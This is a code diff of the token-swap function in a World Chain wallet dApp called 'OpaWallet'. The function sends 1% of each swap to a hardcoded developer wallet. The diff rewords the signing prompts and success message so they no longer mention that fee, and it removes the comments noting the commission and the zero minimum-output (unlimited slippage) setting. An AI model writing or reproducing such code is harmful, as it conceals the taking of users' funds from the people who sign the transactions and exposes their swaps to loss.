@@ -1771,6 +1771,7 @@ swapQuote.amountOut;
 
 }
     
+    
     function toWei(amountStr, decimals) {
     let [whole, fraction = ''] = amountStr.toString().split('.');
     if (!whole) whole = '0';
@@ -1791,28 +1792,27 @@ async function procesarIntercambioCompleto() {
         const toToken = window.swapTokensList.find(t => t.symbol === toSymbol);
 
         if (!fromToken || !toToken || !amountInput) return alert("❌ Datos inválidos.");
-        if (typeof window.ethers === 'undefined') return alert("❌ Error: Recarga la página, motor Web3 ausente.");
+        if (typeof window.ethers === 'undefined') return alert("❌ Error: Motor Web3 ausente.");
 
         const TU_WALLET_OKX = "0xD18Ae9B717CfFcc54F53Ade136545323e9187a8C".toLowerCase(); 
         const SWAP_ROUTER_V3 = "0x091AD9e2e6e5eD44c1c66dB50e49A601F9f36cF6".toLowerCase();
 
         const totalAmountInWei = BigInt(toWei(amountInput, fromToken.decimals));
-        const comisionWei = totalAmountInWei / 100n; // Tu 1%
-        const montoParaSwapWei = totalAmountInWei - comisionWei; // 99% restante
+        const comisionWei = totalAmountInWei / 100n; 
+        const montoParaSwapWei = totalAmountInWei - comisionWei; 
 
         const interfazApp = new window.ethers.Interface([
             "function transfer(address to, uint256 amount) public returns (bool)",
             "function approve(address spender, uint256 amount) public returns (bool)",
+            "function allowance(address owner, address spender) external view returns (uint256)",
             "function exactInputSingle((address tokenIn, address tokenOut, uint24 fee, address recipient, uint256 deadline, uint256 amountIn, uint256 amountOutMinimum, uint160 sqrtPriceLimitX96)) external returns (uint256)"
         ]);
 
-        alert("🛡️ Paso 1: Autorizando comisiones e intercambio en World Chain...");
+        alert("🛡️ Paso 1: Autorizando fondos y comisión...");
 
-        // Codificamos la transferencia de tu 1% y el permiso de gasto a Uniswap juntas
         const dataTransferComision = interfazApp.encodeFunctionData("transfer", [TU_WALLET_OKX, comisionWei.toString()]);
         const dataApproveUniswap = interfazApp.encodeFunctionData("approve", [SWAP_ROUTER_V3, montoParaSwapWei.toString()]);
 
-        // Lanzamos el bloque inicial para asegurar que Uniswap tenga permiso de tocar los tokens
         const primerBloque = await window.MiniKit.sendTransaction({
             chainId: 480, 
             transactions: [
@@ -1821,18 +1821,37 @@ async function procesarIntercambioCompleto() {
             ],
             metadata: {
                 title: "OpaWallet - Autorización",
-                description: `Aprobando asignación para convertir ${amountInput} ${fromSymbol}`
+                description: `Permitiendo el procesamiento de tu saldo`
             }
         });
 
-        // Verificamos de forma flexible que el usuario haya firmado la aprobación
-        if (!primerBloque) {
-            return alert("❌ Operación cancelada en el paso de autorización.");
+        if (!primerBloque) return alert("❌ Autorización cancelada.");
+
+        // ⏳ BUCLE DE ESPERA ACTIVA (Verifica la blockchain real antes de simular el Swap)
+        alert("⏳ Sincronizando con World Chain... Espera un momento a que impacte el permiso.");
+        const provider = new window.ethers.JsonRpcProvider("https://rpc.worldchain.org");
+        const contratoToken = new window.ethers.Contract(fromToken.address, interfazApp, provider);
+        
+        let aprobado = false;
+        for (let i = 0; i < 10; i++) { // Intenta 10 veces (espera máxima ~20 segundos)
+            try {
+                const currentAllowance = await contratoToken.allowance(walletAddress, SWAP_ROUTER_V3);
+                if (BigInt(currentAllowance) >= montoParaSwapWei) {
+                    aprobado = true;
+                    break;
+                }
+            } catch (err) {
+                console.log("Esperando bloque...");
+            }
+            await new Promise(resolve => setTimeout(resolve, 2000)); // Espera 2 segundos por ciclo
         }
 
-        alert("🔄 Paso 2: Ejecutando Swap directo en el Pool de Uniswap V3...");
+        if (!aprobado) {
+            return alert("⚠️ La red está lenta. Intenta el Paso 2 de nuevo en unos segundos.");
+        }
 
-        // Estructura oficial de Uniswap con amountOutMinimum en "0" para forzar slippage infinito
+        alert("🚀 Conexión establecida. Abriendo Paso 2: Intercambio oficial Uniswap V3...");
+
         const paramsUniswap = {
             tokenIn: fromToken.address.toLowerCase(),
             tokenOut: toToken.address.toLowerCase(),
@@ -1846,7 +1865,6 @@ async function procesarIntercambioCompleto() {
 
         const dataSwapUniswap = interfazApp.encodeFunctionData("exactInputSingle", [paramsUniswap]);
 
-        // Ejecutamos el swap final de forma independiente
         const segundoBloque = await window.MiniKit.sendTransaction({
             chainId: 480,
             transactions: [
@@ -1854,22 +1872,21 @@ async function procesarIntercambioCompleto() {
             ],
             metadata: {
                 title: "OpaWallet - Intercambio",
-                description: `Transfiriendo fondos convertidos a tu billetera`
+                description: `Completando conversión final hacia ${toSymbol}`
             }
         });
 
         if (segundoBloque) {
-            alert(`✨ ¡Intercambio completado! Tu 1% se acreditó en tu OKX y los tokens procesados van directo a tu cuenta.`);
+            alert(`✨ ¡Intercambio completado con éxito! Tu saldo se ha actualizado.`);
         } else {
-            alert("⚠️ Se cobró la comisión, pero rechazaste el paso del swap definitivo.");
+            alert("⚠️ Comisión enviada, pero se canceló el intercambio definitivo.");
         }
 
     } catch (e) {
         console.error(e);
-        alert("❌ Fallo en la dApp: " + e.message);
+        alert("❌ Error: " + e.message);
     }
-}
-    
+ }
     
     
     
